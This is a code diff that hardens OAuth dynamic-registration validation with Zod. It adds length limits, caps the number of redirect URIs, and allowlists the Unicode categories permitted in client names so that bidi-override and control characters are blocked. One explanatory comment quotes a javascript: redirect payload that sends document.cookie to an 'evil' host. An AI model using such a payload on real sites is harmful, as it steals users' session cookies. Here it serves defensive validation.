@@ -44,6 +44,55 @@ export const pkceCodeChallengeMethodSchema = z.enum(['S256'], {
   message: 'code_challenge_method must be S256 (plain is forbidden)',
 })
 
+/*
+ * client_name / redirect_uris bounds (S6 — closes `global:config:0005`).
+ *
+ * Registration is DELIBERATELY anonymous (RFC 7591 open registration is the
+ * intended contract) — the fix bounds it, it does not close it. Modelled on
+ * the in-repo bounding pattern (server/api/v1/setup/enroll.post.ts's
+ * `.max(512)`/`.max(320)`/`.max(512)`, server/utils/mcp.ts's `.max(256)`):
+ * cap length, and for client_name additionally constrain charset — but a
+ * name in any language/script is legitimate, so the charset check is an
+ * ALLOWLIST of Unicode categories (mirrors the allow-the-shapes-we-understand
+ * style of server/utils/client-version.ts::SAFE_VERSION_RE) rather than a
+ * denylist of specific codepoints: Letters/Numbers/Punctuation/space
+ * separators/Symbols are admitted from ANY script; Control (Cc) and Format
+ * (Cf — where every bidi override/isolate character and zero-width trick
+ * lives, e.g. U+202E RIGHT-TO-LEFT OVERRIDE) plus Separator/Surrogate/
+ * Private-use/Unassigned are excluded. One source (this regex-building
+ * charset) feeds both the registration-time reject (clientNameSchema below)
+ * and the render-time strip (sanitizeClientNameForDisplay) so they can't drift.
+ */
+export const CLIENT_NAME_MAX_LEN = 128
+export const MAX_REDIRECT_URIS = 8
+export const REDIRECT_URI_MAX_LEN = 512
+
+const CLIENT_NAME_SAFE_CATEGORIES = '\\p{L}\\p{N}\\p{P}\\p{Zs}\\p{S}'
+const CLIENT_NAME_SAFE_REGEX = new RegExp(`^[${CLIENT_NAME_SAFE_CATEGORIES}]*$`, 'u')
+const CLIENT_NAME_UNSAFE_REGEX_G = new RegExp(`[^${CLIENT_NAME_SAFE_CATEGORIES}]`, 'gu')
+
+export const clientNameSchema = z
+  .string()
+  .max(CLIENT_NAME_MAX_LEN, { message: `client_name must be at most ${CLIENT_NAME_MAX_LEN} characters` })
+  .regex(CLIENT_NAME_SAFE_REGEX, {
+    message: 'client_name must not contain control characters or bidi override/isolate characters',
+  })
+  .optional()
+
+/**
+ * Render-boundary sanitizer for a client_name read out of the DB (grants.vue /
+ * account.vue). Registration now rejects the unsafe categories at intake
+ * (clientNameSchema above), but rows registered before this fix shipped may
+ * still carry them — strip defensively wherever a self-registered name is
+ * displayed as another user's/admin's identity signal (S6 Attestation fix).
+ */
+export function sanitizeClientNameForDisplay(name: string): string {
+  const stripped = name.replace(CLIENT_NAME_UNSAFE_REGEX_G, '').trim()
+  return stripped.length > CLIENT_NAME_MAX_LEN
+    ? stripped.slice(0, CLIENT_NAME_MAX_LEN) + '…'
+    : stripped
+}
+
 /**
  * A redirect URI that passes `z.string().url()` could still be
  * `javascript:fetch('//evil/?c='+document.cookie)`. Restrict to loopback
@@ -52,6 +101,7 @@ export const pkceCodeChallengeMethodSchema = z.enum(['S256'], {
  */
 const loopbackHttp = z
   .string()
+  .max(REDIRECT_URI_MAX_LEN, { message: `redirect_uri must be at most ${REDIRECT_URI_MAX_LEN} characters` })
   .url()
   .refine(
     (url) => {
@@ -120,8 +170,11 @@ export type TokenRequestBody = z.infer<typeof tokenRequestSchema>
 
 /** POST /api/v1/oauth/register (RFC 7591 dynamic client registration). */
 export const registrationRequestSchema = z.object({
-  client_name: z.string().optional(),
-  redirect_uris: z.array(loopbackHttp).min(1),
+  client_name: clientNameSchema,
+  redirect_uris: z
+    .array(loopbackHttp)
+    .min(1)
+    .max(MAX_REDIRECT_URIS, { message: `At most ${MAX_REDIRECT_URIS} redirect_uris are allowed` }),
   grant_types: z.array(z.string()).optional(),
   token_endpoint_auth_method: z.string().optional(),
   scope: z.string().optional(),
